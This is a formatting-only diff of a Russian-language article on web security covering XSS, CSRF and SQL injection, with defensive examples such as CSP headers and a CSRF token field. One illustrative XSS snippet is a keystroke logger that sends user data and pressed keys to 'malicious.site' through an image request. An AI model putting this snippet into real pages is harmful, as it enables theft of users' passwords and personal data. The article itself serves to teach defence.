@@ -11,7 +11,7 @@ summary:
   - csrf
   - SQL-инъекции
 cover:
-  desktop: "images/cover.png"
+  desktop: 'images/cover.png'
 ---
 
 ## Кратко
@@ -205,15 +205,15 @@ Content-Security-Policy: default-src 'self' *.trusted.com
 document.body.addEventListener("keypress", (e) => {
   // ...Злоумышленники собираются все данные о пользователе,
   // которые им нужны: логин, время события, что угодно.
-  const data = { ...user, key: e.key };
+  const data = { ...user, key: e.key }
 
   // ...Переводят все данные в строку:
-  const params = new URLSearchParams();
+  const params = new URLSearchParams()
 
   // ...И «запрашивают картинку», но на самом деле
   // отправляют запрос на свой сервер с данными о пользователе.
-  new Image().src = "https://malicious.site?data=" + encodeURIComponent(params);
-});
+  new Image().src = "https://malicious.site?data=" + encodeURIComponent(params)
+})
 ```
 
 Таким образом у пользователя могут украсть пароли и другие персональные данные.
@@ -266,7 +266,7 @@ Set-Cookie: key=value; HttpOnly
         или даже с конкретным запросом для каждого пользователя.
         Злоумышленнику незивестно, по какому принципу токен был сгенерирован,
         поэтому и подделать его у него гораздо меньше шансов. -->
-  <input type="hidden" name="CSRF" value="token-generated-by-server" />
+  <input type="hidden" name="CSRF" value="token-generated-by-server">
 
   <!-- ...Остальная форма -->
 </form>
